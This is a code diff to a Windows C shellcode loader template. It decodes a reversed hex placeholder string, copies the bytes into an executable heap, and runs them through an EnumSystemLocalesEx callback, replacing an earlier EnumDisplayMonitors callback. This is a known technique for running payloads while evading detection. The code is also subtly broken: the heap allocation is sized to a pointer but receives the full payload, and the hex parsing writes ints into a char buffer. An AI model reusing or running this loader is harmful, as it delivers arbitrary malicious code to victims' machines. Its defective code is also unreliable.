@@ -2,33 +2,52 @@
 #define _CRT_SECURE_NO_DEPRECATE
 #include <string.h>
 #include <windows.h>
-#include <stdlib.h>
 #include <stdio.h>
 
-unsigned int FormatCode(char* array) {
+
+void FormatCode(char* array, char* buf) {
 	_strrev(array);
-	unsigned int char_in_hex;
-	unsigned int iterations = strlen(array);
-	unsigned int memory_allocation = strlen(array) / 2;
-	for (unsigned int i = 0; i < iterations - 1; i++) {
-		sscanf_s(array + 2 * i, "%2X", &char_in_hex);
-		array[i] = (char)char_in_hex;
+	while (*array) {
+		if (' ' == *array) {
+			array++;
+			continue;
+		}
+		sscanf(array, "%02X", buf);
+		array += 2;
+		buf++;
 	}
-	return memory_allocation;
 }
 
 void hardCodeM() {
 	char array[] = "{{SHELLCODE_STR}}";
-	unsigned int memory_allocation = FormatCode(array);
+
+	unsigned int memory_allocation = strlen(array)/2;
+
+	char* buf = (char*)malloc(memory_allocation);
+
+	if (NULL == buf) {
+		printf("malloc error");
+		return;
+	}
+
+	memset(buf, 0, memory_allocation);
+
+	FormatCode(array, buf);
 
 	//heap
 	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(memory_allocation));
+	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(buf));
 
-	RtlMoveMemory(ptr, array, memory_allocation);
+	if (NULL == ptr) {
+		printf("HeapAlloc error");
+		return;
+	}
+
+	RtlMoveMemory(ptr, buf, memory_allocation);
 
 	//callback
-    ::EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ptr, NULL);
+
+	::EnumSystemLocalesEx((LOCALE_ENUMPROCEX)ptr, LOCALE_ALL, NULL, NULL);
 }
 
 
